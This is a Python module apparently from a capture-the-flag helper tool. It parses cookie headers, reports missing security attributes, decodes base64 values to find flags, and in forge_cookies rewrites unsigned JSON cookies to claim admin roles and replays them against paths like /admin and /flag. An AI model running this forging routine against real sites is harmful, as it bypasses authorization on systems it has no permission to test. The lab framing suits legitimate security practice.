"""Cookie analysis: flags, values, JWT-in-cookie detection, base64 values,
and forging of unsigned JSON cookies (cookie-manipulation style labs)."""
import base64
import json
import re

from core import httpx
from core.flag import extract_flags


def parse_cookies(set_cookie_headers):
    cookies = []
    for raw in set_cookie_headers:
        parts = [p.strip() for p in raw.split(";")]
        if not parts:
            continue
        nv = parts[0].split("=", 1)
        if len(nv) != 2:
            continue
        name, value = nv[0].strip(), nv[1].strip()
        attrs = set(p.lower() for p in parts[1:])
        cookies.append({
            "name": name, "value": value,
            "httponly": "httponly" in attrs,
            "secure": "secure" in attrs,
            "samesite": next((p for p in attrs if p.startswith("samesite")), "missing"),
            "path": next((p for p in attrs if p.startswith("path")), ""),
            "expires": any(p.startswith("expires") or p.startswith("max-age") for p in attrs),
        })
    return cookies


def analyze_cookies(cookies):
    """Return list of finding lines + flags found."""
    findings = []
    flags = []
    for c in cookies:
        name, value = c["name"], c["value"]
        issues = []
        if not c["httponly"]:
            issues.append("ไม่มี HttpOnly")
        if not c["secure"]:
            issues.append("ไม่มี Secure")
        if c["samesite"] == "missing":
            issues.append("ไม่มี SameSite")
        if issues:
            findings.append(f"  Cookie {name}: {', '.join(issues)}")
        # interesting values
        if value.count(".") == 2 and len(value) > 40:
            findings.append(f"  Cookie {name}: ดูเหมือน JWT ({len(value)} chars)")
        elif re.fullmatch(r"[A-Za-z0-9+/=]{20,}", value):
            try:
                dec = base64.b64decode(value, validate=True)
                text = dec.decode("utf-8", "replace")
                known, cands = extract_flags(text)
                flags.extend(known + cands)
                if known or cands:
                    findings.append(f"  Cookie {name}: base64 -> {text[:80]}")
            except Exception:
                pass
        elif re.fullmatch(r"[0-9a-f]{32,}", value):
            findings.append(f"  Cookie {name}: ดูเหมือน hash (MD5/SHA) — ลอง crack ดู")
        known, cands = extract_flags(value)
        flags.extend(known + cands)
        if name.lower() in ("flag", "admin", "role", "isadmin", "user"):
            findings.append(f"  [!] Cookie {name}={value} — น่าสนใจ (อาจแก้ได้!)")
    return findings, list(dict.fromkeys(flags))


def forge_cookies(cookies, base):
    """Unsigned cookies that are base64(JSON) get re-encoded with admin
    privileges and replayed against the app (base, /flag, /admin, /profile).
    Returns (findings, flags)."""
    findings = []
    flags = []
    for c in cookies:
        value = c["value"]
        try:
            dec = base64.b64decode(value, validate=True).decode("utf-8", "replace")
            obj = json.loads(dec)
        except Exception:
            try:
                obj = json.loads(value)
            except Exception:
                continue
        if not isinstance(obj, dict):
            continue
        # privilege-ish keys present?
        keys = [k for k in obj if re.search(r"role|admin|level|priv|type|user", k, re.I)]
        if not keys:
            continue
        changed = False
        for k in keys:
            low = k.lower()
            if "role" in low or "type" in low or "priv" in low:
                if str(obj[k]).lower() != "admin":
                    obj[k] = "admin"
                    changed = True
            elif "admin" in low or "level" in low:
                if obj[k] not in (True, 1, "1", "true"):
                    obj[k] = True
                    changed = True
        if not changed:
            continue
        forged = base64.b64encode(json.dumps(obj).encode()).decode()
        for path in ("/flag", "/admin", "/profile", "/me", "/dashboard", "/"):
            r = httpx.get(base + path, headers={"Cookie": f"{c['name']}={forged}"},
                          timeout=8)
            if r is None:
                continue
            known, cands = extract_flags(r.text)
            if known + cands:
                findings.append(
                    f"  [!] Cookie {c['name']} ถูก forge: {dec} -> "
                    f"{json.dumps(obj)} → {path} → flag!")
                flags.extend(known + cands)
                break
    return findings, list(dict.fromkeys(flags))
